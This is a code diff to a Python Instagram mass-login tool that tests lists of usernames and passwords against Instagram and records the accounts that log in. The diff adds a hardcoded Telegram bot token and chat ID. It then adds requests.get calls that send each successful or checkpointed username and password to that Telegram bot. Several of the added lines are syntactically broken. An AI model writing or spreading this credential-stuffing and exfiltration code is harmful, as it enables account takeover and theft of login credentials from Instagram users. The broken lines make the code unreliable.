@@ -11,7 +11,8 @@ from colorama import Fore, Style, init
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 import sys
-
+token= '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
+ID = '7327921791'
 # تهيئة colorama للألوان في الوحدة الطرفية
 init(autoreset=True)
 class InstagramAuthHelper:
@@ -330,20 +331,13 @@ class InstagramLogin:
                     self.failure_count += 1
                 return {"status": "failed", "username": username, "password": password}
 
-            if "logged_in_user" in response_text or "userId" in response_text:
+            if "Impossible d’enregistrer vos informations de connexion, mais vous pouvez le faire lors de votre déconnexion" in response_text or "logged_in_user" in response_text:
                 with self.lock:
                     self.success_count += 1
                     print(response_text)
                     self.success.append(username)
                 self._save_success_account(username, password)
                 return {"status": "success", "username": username, "password": password}
-
-            elif 'Impossible d’enregistrer vos informations de connexion' in response_text:
-                with self.lock:
-                    self.success_count += 1
-                    self.success.append(username)
-                self._save_success_account(username, password)
-                return {"status": "success_with_checkpoint", "username": username, "password": password}
 
             elif 'redirect_login_challenges' in response_text or 'CAA_LOGIN_FORM:account_list' in response_text:
                 with self.lock:
@@ -381,7 +375,7 @@ class InstagramLogin:
             f.write(f"""@.   [success_accounts.txt] Success
 ├── Username: {username}
 ├── Password: {password}\n\n""")
-
+        requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ OK- : '+username' ׀ 'password+'\n|')
     def _save_challenge_account(self, username: str, password: str, user_agent: str, mid: str, csrf_token: str) -> None:
         """Save accounts requiring a challenge to a file."""
         print(f"{Fore.YELLOW}[!] Challenge required{Style.RESET_ALL}")
@@ -394,7 +388,7 @@ class InstagramLogin:
             f.write(f"""@.   [challenge_required] Checkpoint
 ├── Username: {username}
 ├── Password: {password}\n\n""")
-
+        requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ CP- : '+username' ׀ 'password+' | ')
 
 
     def _save_challenge1_account(self, username: str, password: str, user_agent: str, mid: str, csrf_token: str) -> None:
@@ -404,7 +398,7 @@ class InstagramLogin:
         os.makedirs("result", exist_ok=True)
         with open("result/challenge_accounts.txt", "a") as f:
             f.write(f"""{username} | {password}\n\n""")
-
+requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ CP1- : '+username+' ׀ '+password+'\n|')
     def _log_error_response(self, response_text: str) -> None:
         """Log error responses to a file for debugging."""
         
@@ -462,7 +456,7 @@ def load_accounts(file_path: str) -> List[Tuple[str, List[str]]]:
 
 def main():
     """Main function to handle Instagram login for multiple accounts."""
-    file_path = input(f"{Fore.CYAN}Enter the path to the accounts file (format: username|fullname): {Style.RESET_ALL}")
+    file_path = input(f"{Fore.CYAN}Enter  file (username|fullname): {Style.RESET_ALL}")
     accounts = load_accounts(file_path)
     
     if not accounts:
